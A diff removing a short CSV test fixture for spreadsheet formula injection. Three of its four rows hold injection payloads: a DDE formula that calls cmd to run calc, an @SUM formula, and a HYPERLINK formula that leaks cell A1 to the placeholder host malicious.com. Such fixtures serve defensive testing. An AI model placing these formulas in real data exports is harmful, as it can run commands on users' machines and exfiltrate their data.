@@ -1,5 +1,0 @@
-id,name,description
-1,Normal Item,This is a safe description.
-2,Malicious Item,"=SUM(1+1)*cmd|' /C calc'!A0"
-3,Injection Test,"@SUM(1,2) + 1"
-4,DDE Test,"+HYPERLINK(""http://malicious.com?leak=""&A1, ""Click for Info"")"
